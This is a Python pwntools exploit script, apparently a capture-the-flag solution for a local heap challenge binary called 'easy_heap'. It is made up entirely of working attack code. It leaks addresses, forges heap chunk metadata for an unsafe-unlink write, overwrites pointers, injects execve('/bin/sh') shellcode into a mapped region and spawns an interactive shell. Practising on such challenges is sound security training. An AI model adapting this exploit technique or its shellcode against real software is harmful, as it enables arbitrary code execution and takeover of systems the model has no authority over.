#coding=utf-8
from pwn import *
a=process("./easy_heap")
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
context.terminal=["tmux","splitw","-h"]
context.arch="amd64"
def add(size):
    a.recvuntil('>>')
    a.sendline('1')
    a.recvuntil('Size')
    a.sendline(str(size))
    a.recvuntil('0x')
    return a.recv(12)
def delete(idx):
    a.recvuntil('>>')
    a.sendline('2')
    a.recvuntil('Index')
    a.sendline(str(idx))
def edit(index,cont):
    a.recvuntil('>>')
    a.sendline('3')
    a.recvuntil('Index')
    a.sendline(str(index))
    a.recvuntil('ntent')
    a.send(cont)
def debug():
    gdb.attach(a,'''
    b *(0x555555554000+0x0000000000010C0)
    b *(0x555555554000+0x000000000001182)
     b *(0x555555554000+0x00000000000121E)
    ''')
a.recvuntil("Mmap: ")
mmap_addr=eval(a.recvuntil("\n",drop=True))
success("mmap_addr ==> 0x%x"%mmap_addr)
text_base=int(add(0x38),16)-0x000000000202060-8 #0 0
add(0x38)#1
success("text_base ==> 0x%x"%text_base)
add(0xf8)#2 0x100
add(0xf8)#3 0x200
chunk_ptr1=text_base+0x000000000202060+24
success("chunk_ptr1 ==> 0x%x"%chunk_ptr1)
payload=p64(0)+p64(0x31)
payload+=p64(chunk_ptr1-24)#fd 
payload+=p64(chunk_ptr1-16)#bk
payload=payload.ljust(0x30,'A')+p64(0x30)
edit(1,payload)
delete(2)
payload=p64(0xf8)+'\x50'+'\n'
edit(1,payload)
edit(0,p64(0)+p64(0x0000000000000131)+p64(0)+p64(0x555555756060-0x555555554000+text_base+8-0x10)+'\n')
add(0x130-8)
#debug()
edit(1,p64(0xf8)+'\xa8\x37\n')
shellcode = '''
.globl _start
_start:
    push 0
    lea rdi,[rip+sh]
    push rdi
    lea rsi,[rsp]
    xor rdx,rdx
    mov rax,59
    syscall
sh:
    .asciz "/bin/sh"
'''
edit(0,p64(mmap_addr)+'\n')
edit(1,p64(0xf8)+p64(mmap_addr)+'\n')
edit(0,asm(shellcode)+'\n')
delete(1)
a.interactive()